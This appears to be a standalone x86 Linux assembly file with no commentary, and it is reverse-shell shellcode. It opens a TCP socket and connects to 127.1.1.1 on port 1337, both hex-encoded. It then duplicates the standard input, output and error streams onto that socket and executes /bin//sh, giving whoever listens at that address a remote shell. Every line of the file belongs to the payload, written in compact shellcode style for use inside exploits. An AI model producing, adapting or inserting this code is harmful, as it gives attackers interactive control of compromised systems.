section .text

global _start

_start:
	xor ecx, ecx
	mul ecx

	xor esi, esi	
	mov al, 0x66
	push ebx
	inc ebx
	push ebx
	push 0x2
	mov ecx,esp
	int 0x80

	xchg edi,eax
	mov al,0x66
	inc ebx
	push 0x101017f
	push word 0x3905
	push bx
	mov ecx,esp
	push 0x10
	push ecx
	push edi
	mov ecx,esp
	inc ebx
	int 0x80

	xor ecx, ecx
	mov cl, 0x2
	xchg ebx, edi

loop:
	mov al,0x3f
	int 0x80
	dec ecx
	jns loop
	
	mov al, 0x0B
	push esi
	push dword 0x68732f2f
	push dword 0x6e69622f
	mov ebx, esp

	push esi
	push ebx
	mov ecx, esp
	mov edx, esi

	int 0x80
